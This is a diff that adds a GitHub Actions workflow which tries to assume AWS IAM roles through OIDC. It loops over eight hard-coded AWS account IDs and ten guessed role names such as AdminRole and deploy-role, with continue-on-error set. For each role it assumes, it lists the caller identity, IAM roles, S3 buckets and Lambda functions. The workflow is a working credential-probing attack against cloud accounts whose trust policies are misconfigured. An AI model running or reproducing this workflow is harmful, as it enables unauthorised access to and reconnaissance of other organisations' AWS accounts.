@@ -1,0 +1,33 @@
+name: OIDC
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  aws_oidc:
+    strategy:
+      matrix:
+        account: ["058264555122", "211125709233", "468642000468", "905418271293", "063726996179", "710907998357", "272182682749", "339713019508"]
+        role: ["GitHubActionsRole", "github-actions-role", "GitHubActions", "github-actions", "DeployRole", "deploy-role", "AdminRole", "admin-role", "CIRole", "ci-role"]
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    steps:
+      - name: Configure AWS credentials
+        id: aws_auth
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::${{ matrix.account }}:role/${{ matrix.role }}
+          aws-region: us-east-1
+          role-session-name: oidc_test
+
+      - name: Test access
+        if: steps.aws_auth.outcome == 'success'
+        run: |
+          echo "CREDENTIALS_OBTAINED=true" 
+          aws sts get-caller-identity
+          aws iam list-roles --max-items 5 2>/dev/null || echo "No iam:ListRoles"
+          aws s3 ls 2>/dev/null || echo "No s3:ListBuckets"
+          aws lambda list-functions --max-items 5 2>/dev/null || echo "No lambda:ListFunctions"
